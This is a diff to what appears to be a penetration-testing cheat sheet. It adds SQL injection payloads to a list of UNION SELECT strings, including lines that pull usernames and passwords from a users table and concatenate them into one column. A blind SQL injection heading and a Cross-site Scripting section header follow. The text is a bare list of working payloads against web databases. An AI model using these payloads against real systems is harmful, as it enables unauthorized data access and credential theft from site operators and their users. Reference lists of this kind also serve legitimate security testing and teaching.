@@ -36,6 +36,11 @@ UNION SELECT column1, column2 FROM table_name -- - dump datas
 UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- -
 -- finding a column containing text
 UNION SELECT 1, 'JqsAUV', 1 FROM information_schema.schemata -- - if give string value to a column and the server is crashed, it means that column is int
+-- retrieving data from other tables
+UNION SELECT username, password FROM users -- -
+-- retrieving multiple values in a single column
+UNION SELECT 1, CONCAT(username, password) FROM users -- -
+-- Blind SQL injection with conditional responses
 ```
 
 ## Cross-site Scripting (XSS)
